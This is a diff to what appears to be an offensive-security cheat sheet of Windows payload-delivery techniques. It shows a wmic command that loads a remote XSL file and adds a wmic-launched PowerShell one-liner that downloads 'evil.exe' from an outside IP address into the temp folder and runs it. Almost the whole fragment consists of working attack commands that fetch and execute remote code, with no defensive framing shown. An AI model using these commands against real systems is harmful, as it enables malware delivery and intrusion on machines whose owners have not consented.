@@ -106,6 +106,9 @@ Wmic
 ```
 wmic os get /FORMAT:"http://192.168.189.131:9996/pMeV8.xsl"
 ```
+```
+wmic process call create "powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://192.168.189.131:7777/evil.exe', '%temp%\evil.exe'); Start-Process -Filepath '%temp%\evil.exe'" "
+```
 
 ## Others
 
